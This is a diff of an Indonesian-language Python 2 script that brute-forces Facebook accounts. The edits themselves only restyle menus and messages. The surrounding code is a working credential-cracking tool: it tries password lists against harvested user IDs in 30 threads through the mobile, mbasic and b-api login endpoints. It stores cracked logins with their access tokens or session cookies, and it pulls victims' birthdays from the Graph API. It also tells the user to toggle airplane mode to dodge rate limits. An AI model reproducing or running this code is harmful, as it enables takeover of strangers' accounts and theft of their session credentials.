@@ -212,7 +212,7 @@ class ngentod:
         except:
             print '\n%s╠═[!] File dump tidak ada, dump id dulu lah kentod'%(M)
             raw_input('\n%s╚═[ %sEnter %s] '%(P,K,P));menu()
-        unikers = raw_input('%s╚═[?] ingin gunakan password manual? (y/t) :%s '%(P,K))
+        unikers = raw_input('%s╚═[?] ingin gunakan password manual? [y/t] :%s '%(P,K))
         if unikers in ('Y', 'y'):
             print '\n%s╔═[%s!%s] Gunakan (koma) untuk tanda pemisah '%(P,M,P,H,P)
             while True:
@@ -223,13 +223,13 @@ class ngentod:
                     print '\n%s╚═[!] password minimal 6 karakter'%(M)
                 else:
                     def zona(zafi_=None): 
-                        ind = raw_input('\n%s[?] metode : %s'%(P,K))
+                        ind = raw_input('\n%s╠═[?] metode : %s'%(P,K))
                         if ind == '':
                             print("%s╚═[•] Isi yang benar kentod "%(M));self.zona()
                         elif ind in ('1', '01'):
                             print '\n%s╔═[%s+%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s╠═[%s+%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s╚═[%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
+                            print '%s╚═[%s!%s] Jika tidak ada hasil gunakan mode pesawat (5 detik)\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -240,7 +240,7 @@ class ngentod:
                         elif ind in ('2', '02'):
                             print '\n%s╔═[%s+%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s╠═[%s+%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s╚═[%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
+                            print '%s╚═[%s!%s] Jika tidak ada hasil gunakan mode pesawat (5 detik)\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -251,7 +251,7 @@ class ngentod:
                         elif ind in ('3', '03'):
                             print '\n%s╔═[%s+%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s╠═[%s+%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s╚═[%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
+                            print '%s╚═[%s!%s] Jika tidak ada hasil gunakan mode pesawat (5 detik)\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -261,17 +261,17 @@ class ngentod:
                             os.remove(self.apk);exit()
                         else:
                             print ('\n %s[!] isi yang benar kentod'%(M));zona()
-                    print '\n%s[ pilih metode crack - silahkan coba satu² ]\n'%(P)
-                    print '[%s01%s] metode b-api [cepat ]'%(K,P)
-                    print '[%s02%s] metode mbasic [lambat & rekomendasi]'%(K,P)
-                    print '[%s03%s] metode mobile [sangat lambat] '%(K,P)
+                    print '\n%s╠═[ pilih metode crack - silahkan coba satu² ]\n'%(P)
+                    print '╔═[%s01%s] metode b-api [cepat ]'%(K,P)
+                    print '╠═[%s02%s] metode mbasic [lambat & rekomendasi]'%(K,P)
+                    print '╚═[%s03%s] metode mobile [sangat lambat] '%(K,P)
                     zona(pwx.split(','))
                     break
         elif unikers in ('T', 't'):
-            print '\n%s[ pilih metode crack - silahkan coba satu² ]\n'%(P)
-            print '[%s01%s] metode b-api [cepat]'%(K,P)
-            print '[%s02%s] metode mbasic [lambat & rekomendasi]'%(K,P)
-            print '[%s03%s] metode mobile [sangat lambat] '%(K,P)
+            print '\n%s╠═[ pilih metode crack - silahkan coba satu² ]\n'%(P)
+            print '╔═[%s01%s] metode b-api [cepat]'%(K,P)
+            print '╠═[%s02%s] metode mbasic [lambat & rekomendasi]'%(K,P)
+            print '╚═[%s03%s] metode mobile [sangat lambat] '%(K,P)
             self.langsung()
         else:
             print("%s[!] Isi yang benar kentod "%(M));jeda(2);menu()
@@ -282,7 +282,7 @@ class ngentod:
         elif suuu in ('1', '01'):
             print '\n%s╔═[%s+%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
             print '%s╠═[%s+%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-            print '%s╚═[%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
+            print '%s╚═[%s!%s] Jika tidak ada hasil gunakan mode pesawat (5 detik)\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -298,7 +298,7 @@ class ngentod:
         elif suuu in ('2', '02'):
             print '\n%s╔═[%s+%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
             print '%s╠═[%s+%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-            print '%s╚═[%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
+            print '%s╚═[%s!%s] Jika tidak ada hasil gunakan mode pesawat (5 detik)\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -314,7 +314,7 @@ class ngentod:
         elif suuu in ('3', '03'):
             print '\n%s╔═[%s+%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
             print '%s╠═[%s+%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-            print '%s╚═[%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
+            print '%s╚═[%s!%s] Jika tidak ada hasil gunakan mode pesawat (5 detik)\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -354,7 +354,7 @@ class ngentod:
                 sys.stdout.flush()
                 b_api(self, user, zona)
             if 'session_key' in response.text and 'EAAA' in response.text:
-                print '\r %s-> %s • %s • %s ' % (H,user,pw,response.json()['access_token'])
+                print '\r%s[Okeh] %s • %s • %s ' % (H,user,pw,response.json()['access_token'])
                 ok.append('%s • %s • %s' % (user,pw,response.json()['access_token']))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('[Okeh] %s • %s • %s\n'%(user,pw,response.json()['access_token']))
                 break
@@ -365,7 +365,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r %s-> %s • %s • %s %s %s  ' % (K,user,pw,day,month,year)
+                    print '\r%s[Cepeh] %s • %s • %s %s %s  ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe]%s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -374,7 +374,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r %s-> %s • %s           ' % (K,user,pw)
+                print '\r%s[Cepeh] %s • %s           ' % (K,user,pw)
                 cp.append('%s • %s' % (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe] %s • %s\n"%(user,pw))
                 break
@@ -413,7 +413,7 @@ class ngentod:
             po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r %s-> %s • %s • %s  ' % (H,user,pw,kuki)
+                print '\r%s[Okeh] %s • %s • %s  ' % (H,user,pw,kuki)
                 ok.append("%s • %s • %s"% (user,pw,kuki))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Okeh] %s • %s • %s\n"%(user,pw,kuki))
                 break
@@ -424,7 +424,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r %s-> %s • %s • %s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r%s[Cepeh] %s • %s • %s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe]%s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -433,7 +433,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r %s-> %s • %s            ' % (K,user,pw)
+                print '\r%s[Cepeh] %s • %s            ' % (K,user,pw)
                 cp.append("%s • %s"% (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe] %s • %s\n"%(user,pw))
                 break
@@ -472,7 +472,7 @@ class ngentod:
             po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r %s-> %s • %s • %s ' % (H,user,pw,kuki)
+                print '\r%s[Okeh] %s • %s • %s ' % (H,user,pw,kuki)
                 ok.append("%s • %s • %s"% (user,pw,kuki))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Okeh] %s • %s • %s\n"%(user,pw,kuki))
                 break
@@ -483,7 +483,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r %s-> %s • %s • %s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r%s[Cepeh] %s • %s • %s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -492,7 +492,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r %s-> %s • %s              ' % (K,user,pw)
+                print '\r%s[Cepeh] %s • %s              ' % (K,user,pw)
                 cp.append("%s • %s"% (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Cepe] %s • %s\n"%(user,pw))
                 break
@@ -589,7 +589,7 @@ def uas():
         print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
     elif u in("1","01"):
     	print ("%s╠═[%s•%s] ketik %sMy user agent%s di browser google chrome\n╠═[%s•%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
-    	print ("[%s•%s] ketik %sdefault%s untuk gunakan user agent bawaan script"%(K,P,H,P))
+    	print ("╠═[%s•%s] ketik %sdefault%s untuk gunakan user agent bawaan script"%(K,P,H,P))
     	try:
     	    ua = raw_input("%s╚═[?] user agent : %s"%(P,K))
             if ua in(""):
